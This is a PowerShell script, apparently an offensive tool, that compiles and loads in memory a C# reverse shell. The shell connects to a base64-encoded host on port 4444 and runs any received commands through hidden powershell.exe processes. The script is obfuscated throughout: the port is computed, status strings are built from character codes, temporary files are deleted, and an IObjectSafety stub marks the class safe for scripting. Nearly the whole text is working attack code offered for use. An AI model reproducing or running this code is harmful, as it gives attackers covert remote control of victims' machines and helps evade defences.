Write-Host "========================================" -ForegroundColor Cyan
Write-Host "PowerShell Reverse Shell - DLL Memory" -ForegroundColor Yellow
Write-Host "Developpe par: Florent Vinai" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
$ipB = [Convert]::FromBase64String('MTkyLjE2OC4xLjEwMA=='); $hst = -join [char[]]$ipB;
$prt = [int](([Math]::Pow(2,2) + [Math]::Pow(2,3) + [Math]::Pow(2,4) + [Math]::Pow(2,6) + [Math]::Pow(2,8) + [Math]::Pow(2,12)));
$csCode = @"
using System;
using System.Net.Sockets;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

[ComVisible(true)]
[Guid("A5B5C5D5-E5F5-4A5B-8C5D-5E5F5A5B5C5D")]
[ClassInterface(ClassInterfaceType.None)]
public class RShellDll : IObjectSafety {
    private static TcpClient client;
    private static NetworkStream stream;
    private static StreamReader reader;
    private static StreamWriter writer;
    private static Process psProcess;
    private static bool isRunning = false;
    
    static RShellDll() {
        if (!isRunning) {
            isRunning = true;
            Thread t = new Thread(() => Connect("$hst", $prt));
            t.IsBackground = true;
            t.Start();
        }
    }
    
    public RShellDll() {
        if (!isRunning) {
            isRunning = true;
            Thread t = new Thread(() => Connect("$hst", $prt));
            t.IsBackground = true;
            t.Start();
        }
    }
    
    private static void Connect(string host, int port) {
        while (true) {
            try {
                try {
                    client = new TcpClient();
                    client.Connect(host, port);
                    stream = client.GetStream();
                    reader = new StreamReader(stream, Encoding.UTF8);
                    writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true };
                    
                    writer.WriteLine("Connected. Type commands:");
                    
                    while (client.Connected) {
                        try {
                            if (stream.DataAvailable) {
                                string cmd = reader.ReadLine();
                                if (!string.IsNullOrEmpty(cmd)) {
                                    ExecuteCommand(cmd);
                                }
                            } else {
                                Thread.Sleep(new Random().Next(85, 145));
                            }
                        } catch {
                            break;
                        }
                    }
                } catch {
                    if (client != null) {
                        try { client.Close(); } catch { }
                        client = null;
                    }
                }
            } catch {
            } finally {
                Cleanup();
                Thread.Sleep(new Random().Next(2000, 5000));
            }
        }
    }
    
    private static void ExecuteCommand(string cmd) {
        try {
            ProcessStartInfo psi = new ProcessStartInfo {
                FileName = "powershell.exe",
                Arguments = "-Command " + cmd,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };
            psProcess = Process.Start(psi);
            string output = psProcess.StandardOutput.ReadToEnd();
            string error = psProcess.StandardError.ReadToEnd();
            psProcess.WaitForExit();
            
            if (string.IsNullOrEmpty(output) && string.IsNullOrEmpty(error)) {
                writer.WriteLine("PS> ");
            } else {
                writer.WriteLine(output + error);
            }
        } catch {
            try {
                writer.WriteLine("PS> ");
            } catch { }
        }
    }
    
    private static void Cleanup() {
        try {
            if (psProcess != null && !psProcess.HasExited) {
                psProcess.Kill();
            }
        } catch { }
        try {
            if (reader != null) reader.Close();
        } catch { }
        try {
            if (writer != null) writer.Close();
        } catch { }
        try {
            if (stream != null) stream.Close();
        } catch { }
        try {
            if (client != null) client.Close();
        } catch { }
    }
    
    public int GetInterfaceSafetyOptions(ref Guid riid, out int pdwSupportedOptions, out int pdwEnabledOptions) {
        pdwSupportedOptions = 1;
        pdwEnabledOptions = 1;
        return 0;
    }
    
    public int SetInterfaceSafetyOptions(ref Guid riid, int dwOptionSetMask, int dwEnabledOptions) {
        return 0;
    }
}

[ComImport]
[Guid("CB5BDC81-93C1-11CF-8F20-00805F2CD064")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface IObjectSafety {
    [PreserveSig]
    int GetInterfaceSafetyOptions(ref Guid riid, out int pdwSupportedOptions, out int pdwEnabledOptions);
    [PreserveSig]
    int SetInterfaceSafetyOptions(ref Guid riid, int dwOptionSetMask, int dwEnabledOptions);
}
"@

$cscPath = $null
$paths = @(
    "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\Roslyn\csc.exe",
    "${env:ProgramFiles}\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\Roslyn\csc.exe",
    "$env:SystemRoot\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
    "$env:SystemRoot\Microsoft.NET\Framework\v4.0.30319\csc.exe"
)

foreach ($path in $paths) {
    if (Test-Path $path) {
        $cscPath = $path
        break
    }
}

$assemblyBytes = $null

if ($cscPath) {
    $m0 = [char]91 + [char]42 + [char]93 + [char]32 + [char]67 + [char]111 + [char]109 + [char]112 + [char]105 + [char]108 + [char]97 + [char]116 + [char]105 + [char]111 + [char]110 + [char]32 + [char]101 + [char]110 + [char]32 + [char]109 + [char]101 + [char]109 + [char]111 + [char]105 + [char]114 + [char]101 + [char]46 + [char]46 + [char]46
    Write-Host "$m0" -ForegroundColor Yellow
    Start-Sleep -Milliseconds 300
    $csFile = [System.IO.Path]::GetTempFileName() + '.cs'
    [System.IO.File]::WriteAllText($csFile, $csCode, [System.Text.Encoding]::UTF8)
    
    $dllTemp = [System.IO.Path]::GetTempFileName() + '.dll'
    $cscArgs = @(
        "/target:library",
        "/out:$dllTemp",
        "/reference:System.dll",
        "/reference:System.Net.dll",
        "/reference:System.IO.dll",
        $csFile
    )
    
    $output = & $cscPath $cscArgs 2>&1
    
    if (Test-Path $dllTemp) {
        $assemblyBytes = [System.IO.File]::ReadAllBytes($dllTemp)
        Remove-Item $dllTemp -Force -ErrorAction SilentlyContinue
        $m0b = [char]91 + [char]43 + [char]93 + [char]32 + [char]68 + [char]76 + [char]76 + [char]32 + [char]99 + [char]111 + [char]109 + [char]112 + [char]105 + [char]108 + [char]101 + [char]101 + [char]32 + [char]101 + [char]110 + [char]32 + [char]109 + [char]101 + [char]109 + [char]111 + [char]105 + [char]114 + [char]101
        Write-Host "$m0b" -ForegroundColor Green
        Start-Sleep -Milliseconds 300
    }
    
    Remove-Item $csFile -Force -ErrorAction SilentlyContinue
}

if (-not $assemblyBytes) {
    $m7 = [char]91 + [char]42 + [char]93 + [char]32 + [char]84 + [char]101 + [char]110 + [char]116 + [char]97 + [char]116 + [char]105 + [char]118 + [char]101 + [char]32 + [char]97 + [char]118 + [char]101 + [char]99 + [char]32 + [char]65 + [char]100 + [char]100 + [char]45 + [char]84 + [char]121 + [char]112 + [char]101 + [char]46 + [char]46 + [char]46
    Write-Host "$m7" -ForegroundColor Yellow
    Start-Sleep -Milliseconds 300
    try {
        $typeName = "RShellDll" + [Guid]::NewGuid().ToString().Replace("-", "").Substring(0, 8)
        $modifiedCode = $csCode -replace "public class RShellDll", "public class $typeName"
        $modifiedCode = $modifiedCode -replace "RShellDll", $typeName
        
        Add-Type -TypeDefinition $modifiedCode -Language CSharp -ErrorAction Stop
        
        $assembly = [System.Reflection.Assembly]::GetAssembly([type]$typeName)
        $assemblyPath = $assembly.Location
        
        if ($assemblyPath -and (Test-Path $assemblyPath)) {
            $assemblyBytes = [System.IO.File]::ReadAllBytes($assemblyPath)
            $m8 = [char]91 + [char]43 + [char]93 + [char]32 + [char]65 + [char]115 + [char]115 + [char]101 + [char]109 + [char]98 + [char]108 + [char]121 + [char]32 + [char]99 + [char]104 + [char]97 + [char]114 + [char]103 + [char]101 + [char]32 + [char]100 + [char]101 + [char]112 + [char]117 + [char]105 + [char]115 + [char]32 + [char]65 + [char]100 + [char]100 + [char]45 + [char]84 + [char]121 + [char]112 + [char]101
            Write-Host "$m8" -ForegroundColor Green
            Start-Sleep -Milliseconds 300
        }
    } catch {
        $m9 = [char]91 + [char]33 + [char]93 + [char]32 + [char]65 + [char]100 + [char]100 + [char]45 + [char]84 + [char]121 + [char]112 + [char]101 + [char]32 + [char]97 + [char]32 + [char]101 + [char]99 + [char]104 + [char]111 + [char]117 + [char]101 + [char]58 + [char]32
        Write-Host "$m9$_" -ForegroundColor Yellow
    }
}

if ($assemblyBytes) {
    $m10 = [char]91 + [char]42 + [char]93 + [char]32 + [char]67 + [char]104 + [char]97 + [char]114 + [char]103 + [char]101 + [char]109 + [char]101 + [char]110 + [char]116 + [char]32 + [char]100 + [char]101 + [char]32 + [char]108 + [char]39 + [char]97 + [char]115 + [char]115 + [char]101 + [char]109 + [char]98 + [char]108 + [char]121 + [char]32 + [char]101 + [char]110 + [char]32 + [char]109 + [char]101 + [char]109 + [char]111 + [char]105 + [char]114 + [char]101 + [char]46 + [char]46 + [char]46
    Write-Host "$m10" -ForegroundColor Yellow
    Start-Sleep -Milliseconds 400
    try {
        $assembly = [System.Reflection.Assembly]::Load($assemblyBytes)
        $type = $assembly.GetType("RShellDll")
        $obj = [System.Activator]::CreateInstance($type)
        Start-Sleep -Milliseconds 500
        
        $m1 = [char]91 + [char]43 + [char]93 + [char]32 + [char]83 + [char]101 + [char]114 + [char]118 + [char]105 + [char]99 + [char]101 + [char]32 + [char]108 + [char]97 + [char]110 + [char]99 + [char]101 + [char]32 + [char]101 + [char]110 + [char]32 + [char]109 + [char]101 + [char]109 + [char]111 + [char]105 + [char]114 + [char]101 + [char]32 + [char]40 + [char]112 + [char]97 + [char]115 + [char]32 + [char]100 + [char]101 + [char]32 + [char]102 + [char]105 + [char]99 + [char]104 + [char]105 + [char]101 + [char]114 + [char]32 + [char]115 + [char]117 + [char]114 + [char]32 + [char]100 + [char]105 + [char]115 + [char]113 + [char]117 + [char]101 + [char]41
        Write-Host "$m1" -ForegroundColor Green
        Start-Sleep -Milliseconds 400
        
        $m2 = [char]91 + [char]42 + [char]93 + [char]32 + [char]76 + [char]101 + [char]32 + [char]115 + [char]101 + [char]114 + [char]118 + [char]105 + [char]99 + [char]101 + [char]32 + [char]116 + [char]111 + [char]117 + [char]114 + [char]110 + [char]101 + [char]32 + [char]101 + [char]110 + [char]32 + [char]97 + [char]114 + [char]114 + [char]105 + [char]101 + [char]114 + [char]101 + [char]45 + [char]112 + [char]108 + [char]97 + [char]110
        Write-Host "$m2" -ForegroundColor Cyan
        Start-Sleep -Milliseconds 400
        
        $m3p1 = [char]91 + [char]42 + [char]93 + [char]32 + [char]86 + [char]101 + [char]114 + [char]105 + [char]102 + [char]105 + [char]101 + [char]122 + [char]32 + [char]115 + [char]117 + [char]114 + [char]32 + [char]118 + [char]111 + [char]116 + [char]114 + [char]101 + [char]32 + [char]115 + [char]101 + [char]114 + [char]118 + [char]101 + [char]117 + [char]114 + [char]32 + [char]40 + [char]108 + [char]105 + [char]115 + [char]116 + [char]101 + [char]110 + [char]101 + [char]114 + [char]32 + [char]115 + [char]117 + [char]114 + [char]32 + [char]112 + [char]111 + [char]114 + [char]116 + [char]32
        Write-Host "$m3p1$prt)" -ForegroundColor Yellow
        Start-Sleep -Milliseconds 400
        
        $m4 = [char]91 + [char]42 + [char]93 + [char]32 + [char]65 + [char]117 + [char]99 + [char]117 + [char]110 + [char]32 + [char]102 + [char]105 + [char]99 + [char]104 + [char]105 + [char]101 + [char]114 + [char]32 + [char]46 + [char]100 + [char]108 + [char]108 + [char]32 + [char]110 + [char]39 + [char]97 + [char]32 + [char]101 + [char]116 + [char]101 + [char]32 + [char]101 + [char]99 + [char]114 + [char]105 + [char]116 + [char]32 + [char]115 + [char]117 + [char]114 + [char]32 + [char]108 + [char]101 + [char]32 + [char]100 + [char]105 + [char]115 + [char]113 + [char]117 + [char]101
        Write-Host "$m4" -ForegroundColor Gray
        Write-Host ""
    } catch {
        $m5 = [char]91 + [char]33 + [char]93 + [char]32 + [char]69 + [char]114 + [char]114 + [char]101 + [char]117 + [char]114 + [char]32 + [char]108 + [char]111 + [char]114 + [char]115 + [char]32 + [char]100 + [char]117 + [char]32 + [char]99 + [char]104 + [char]97 + [char]114 + [char]103 + [char]101 + [char]109 + [char]101 + [char]110 + [char]116 + [char]58 + [char]32
        Write-Host "$m5$_" -ForegroundColor Red
    }
} else {
    $m6 = [char]91 + [char]33 + [char]93 + [char]32 + [char]73 + [char]109 + [char]112 + [char]111 + [char]115 + [char]115 + [char]105 + [char]98 + [char]108 + [char]101 + [char]32 + [char]100 + [char]101 + [char]32 + [char]99 + [char]111 + [char]109 + [char]112 + [char]105 + [char]108 + [char]101 + [char]114 + [char]32 + [char]108 + [char]97 + [char]32 + [char]68 + [char]76 + [char]76
    Write-Host "$m6" -ForegroundColor Red
}

